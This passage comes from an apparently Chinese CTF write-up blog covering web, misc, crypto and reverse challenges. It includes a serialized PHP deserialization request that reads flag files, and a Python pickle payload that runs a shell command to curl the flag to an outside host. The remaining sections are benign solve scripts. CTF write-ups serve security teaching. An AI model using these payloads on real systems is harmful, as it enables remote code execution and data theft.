class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>AAA%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>s%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>BBB%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>B%<span class="hljs-number">40</span>-%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lewiserii%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BR%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>B% HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.100</span>:<span class="hljs-number">10033</span><br>Content-Length: <span class="hljs-number">186</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: <span class="hljs-literal">null</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pS<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">119.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /f*</span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="决赛-babyWeb"><a href="#决赛-babyWeb" class="headerlink" title="决赛[babyWeb]"></a>决赛[babyWeb]</h2><p>pickle反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetShellWithPython</span>(<span class="hljs-title class_ inherited__">object</span>):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">import</span> subprocess<br>       <span class="hljs-keyword">return</span> (subprocess.call,<br>              ([<span class="hljs-string">&#x27;python&#x27;</span>,<br>                 <span class="hljs-string">&#x27;-c&#x27;</span>,<br>                 <span class="hljs-string">&#x27;import os;&#x27;</span><br>                 <span class="hljs-string">&#x27;os.system(&quot;curl http://x.x.x.x:4444?a=`cat /flag`&quot;);&#x27;</span>],))<br><br>pickleData = pickle.dumps(GetShellWithPython())<br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickleData))<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="初赛-number-game"><a href="#初赛-number-game" class="headerlink" title="初赛[number game]"></a>初赛[number game]</h2><p>查看index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x38f496 = _0x359f<br>      , _0x1afb7a = <span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xda</span>)](<span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd5</span>)]() * <span class="hljs-number">0x3e8</span>);<br>    <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;getElementById&#x27;</span>](<span class="hljs-string">&#x27;number&#x27;</span>)[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xdc</span>)] = _0x1afb7a[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd3</span>)]();<br>    <span class="hljs-keyword">if</span> (_0x1afb7a == <span class="hljs-number">0x539</span>) &#123;<br>        <span class="hljs-keyword">var</span> _0x14184c = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5a</span>]<br>          , _0x477866 = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x6698b7 = <span class="hljs-number">0x0</span>; _0x6698b7 &lt; _0x14184c[<span class="hljs-string">&#x27;length&#x27;</span>]; _0x6698b7++)<br>            _0x477866 += <span class="hljs-title class_">String</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd9</span>)](_0x14184c[_0x6698b7] ^ _0x6698b7 + <span class="hljs-number">0x5a</span>);<br>        <span class="hljs-title function_">alert</span>(_0x477866);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x38</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x5a</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    a[i]=v^i+<span class="hljs-number">0x5a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-Ez-misc"><a href="#初赛-Ez-misc" class="headerlink" title="初赛[Ez_misc]"></a>初赛[Ez_misc]</h2><p>文件高位和低位交换位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.jpg&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>d=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    n=(i//<span class="hljs-number">16</span>)+((i&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>([n]))<br></code></pre></td></tr></table></figure><p>steghide空密码解密得到flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc1-1.png"></p><p>将<code>DASH</code>替换成<code>-</code>，<code>DOT</code>替换成<code>.</code>后解摩斯</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc1-2.png"></p><h2 id="初赛-Steins-Gate"><a href="#初赛-Steins-Gate" class="headerlink" title="初赛[Steins_Gate]"></a>初赛[Steins_Gate]</h2><p>给了一张很大的图片，由<code>嘟嘟噜</code>组成一张图片，观察发现每个字是<code>16*16</code></p><p>猜测是把原图像素替换成文字了</p><p>在每个字中找一个固定的像素点，然后提取像素还原原图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Steins_Gate.png&#x27;</span>)<br>width,height=img.size<br><br>new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-built_in">int</span>(width / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(height / <span class="hljs-number">16</span>)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,height,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,width,<span class="hljs-number">16</span>):<br>        tmp = img.getpixel((j,i))<br>        <span class="hljs-built_in">print</span>(tmp)<br>        new_img.putpixel((<span class="hljs-built_in">int</span>(j / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(i / <span class="hljs-number">16</span>)), (tmp[<span class="hljs-number">0</span>], tmp[<span class="hljs-number">1</span>], tmp[<span class="hljs-number">2</span>]))<br><br>new_img.show()<br>new_img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-1.png"></p><p>使用stegsolve发现0通道有很多base64</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-2.png"></p><p>提取出来后发现每组后还有12个字节的冗余数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        data=f.read()<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>            f1.write(data[i:i+<span class="hljs-number">240</span>]+<span class="hljs-string">b&quot;\n&quot;</span>)<br>            i+=<span class="hljs-number">252</span><br></code></pre></td></tr></table></figure><p>去除冗余数据后base64解出一张图片</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-3.png"></p><p>同时也是多行base64的形式，尝试base64隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64解码脚本，Python2 运行</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure><p>得到密码<code>DuDuLu~T0_Ch3@t_THe_w0r1d</code></p><p>outguess解密得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-4.png"></p><h2 id="决赛-Xcode-v5-8"><a href="#决赛-Xcode-v5-8" class="headerlink" title="决赛[Xcode v5.8]"></a>决赛[Xcode v5.8]</h2><p>xxencode-&gt;base58</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-misc1-1.png"></p><h2 id="决赛-Ez-Signin"><a href="#决赛-Ez-Signin" class="headerlink" title="决赛[Ez_Signin]"></a>决赛[Ez_Signin]</h2><p>zip爆破密码，得到<code>11452</code></p><p>base32解密后得到一个文本</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">MoveTo 495, 314<br>KeyUp &quot;CapsLock&quot;, 1<br>LeftClick 1<br>LeftDown 1<br>MoveTo 495, 313<br>MoveTo 495, 312<br>MoveTo 494, 312<br>MoveTo 494, 311<br>MoveTo 493, 311<br>Delay 1<br>...<br>省略<br>...<br>MouseWheel 1<br>Delay 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>KeyDown &quot;CapsLock&quot;, 1<br></code></pre></td></tr></table></figure><p>根据文本内容进行画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">2000</span>,<span class="hljs-number">2000</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>d=f.read().splitlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MoveTo&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">continue</span><br>    i=i[<span class="hljs-number">6</span>:].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    x=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])<br>    y=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])<br>    a.putpixel((x,y),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-misc2-1.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="初赛-小小数学家"><a href="#初赛-小小数学家" class="headerlink" title="初赛[小小数学家]"></a>初赛[小小数学家]</h2><p>计算式子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[]<br>a.append(<span class="hljs-number">19</span>+<span class="hljs-number">49</span>)<br>a.append(<span class="hljs-number">96</span>-<span class="hljs-number">31</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">47</span>)<br>a.append(<span class="hljs-number">29</span>+<span class="hljs-number">55</span>)<br>a.append(<span class="hljs-number">35</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">81</span>+<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">73</span>-<span class="hljs-number">16</span>)<br>a.append(<span class="hljs-number">52</span>+<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">0</span>+<span class="hljs-number">56</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">69</span>-<span class="hljs-number">20</span>)<br>a.append(<span class="hljs-number">99</span>-<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">100</span>-<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">36</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">32</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">84</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">90</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">94</span>-<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">85</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">50</span>-<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">77</span>+<span class="hljs-number">25</span>)<br>a.append(<span class="hljs-number">87</span>-<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">62</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">88</span>-<span class="hljs-number">43</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">30</span>)<br>a.append(<span class="hljs-number">90</span>+<span class="hljs-number">10</span>)<br>a.append(<span class="hljs-number">66</span>-<span class="hljs-number">17</span>)<br>a.append(<span class="hljs-number">34</span>+<span class="hljs-number">63</span>)<br>a.append(<span class="hljs-number">51</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">22</span>+<span class="hljs-number">76</span>)<br>a.append(<span class="hljs-number">46</span>+<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">45</span>+<span class="hljs-number">11</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">78</span>)<br>a.append(<span class="hljs-number">56</span>+<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">99</span>//<span class="hljs-number">1</span>)<br>a.append(<span class="hljs-number">47</span>+<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">58</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">76</span>-<span class="hljs-number">26</span>)<br>a.append(<span class="hljs-number">92</span>-<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">12</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">80</span>-<span class="hljs-number">27</span>)<br>a.append(<span class="hljs-number">5</span>*<span class="hljs-number">25</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-An-EaSy-Cipher"><a href="#初赛-An-EaSy-Cipher" class="headerlink" title="初赛[An EaSy Cipher]"></a>初赛[An EaSy Cipher]</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">[&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;,&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;]<br></code></pre></td></tr></table></figure><p>提示：<code>ECB 0 128 six numbers</code></p><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">c=<span class="hljs-string">&quot;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&quot;</span><br>key=<span class="hljs-string">&quot;RUNCIDAgMTI4IHNpeCBudW1iZXJz&quot;</span><br><br><span class="hljs-comment">#mcrypt是自定义的模块，包含aes</span><br><span class="hljs-keyword">from</span> mcrypt.boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.base <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> mcrypt.aes <span class="hljs-keyword">import</span> *<br>base=<span class="hljs-string">&quot;0123456789&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Gendic(base,<span class="hljs-number">6</span>,<span class="hljs-literal">True</span>):<br>    a=aes(<span class="hljs-string">&#x27;&#x27;</span>.join(i),Pad_type=<span class="hljs-number">1</span>)<br>    data=a.decrypt(b64().decode(c))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>),i)<br>        f.write(data)<br>        f.write(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        f.flush()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-crypto1-1.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="初赛-pyccc"><a href="#初赛-pyccc" class="headerlink" title="初赛[pyccc]"></a>初赛[pyccc]</h2><p>使用pycdc反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 